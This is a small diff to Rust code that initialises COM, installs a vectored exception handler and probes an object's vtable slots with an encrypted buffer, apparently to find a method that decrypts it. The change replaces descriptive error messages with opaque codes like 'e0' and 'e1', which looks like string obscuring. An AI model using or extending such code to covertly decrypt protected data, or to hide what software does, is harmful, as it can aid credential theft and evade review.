@@ -239,7 +239,7 @@ fn install_veh() {
 }
 
 unsafe fn try_slots(punk: *mut c_void, enc: &[u8], slots: &[usize]) -> Result<Vec<u8>, String> {
-    let api = init_com().ok_or("no com")?;
+    let api = init_com().ok_or("e0")?;
     let vtbl = *(punk as *const *const c_void);
 
     for &slot in slots {
@@ -272,11 +272,11 @@ unsafe fn try_slots(punk: *mut c_void, enc: &[u8], slots: &[usize]) -> Result<Ve
             }
         }
     }
-    Err("no slot worked".into())
+    Err("e1".into())
 }
 
 unsafe fn try_one(clsid: &[u8], iid: &[u8], enc: &[u8], slots: &[usize]) -> Result<Vec<u8>, String> {
-    let api = init_com().ok_or("no com")?;
+    let api = init_com().ok_or("e0")?;
     let hr = (api.co_init)(std::ptr::null(), COINIT_MULTITHREADED);
 
     let mut punk: *mut c_void = std::ptr::null_mut();
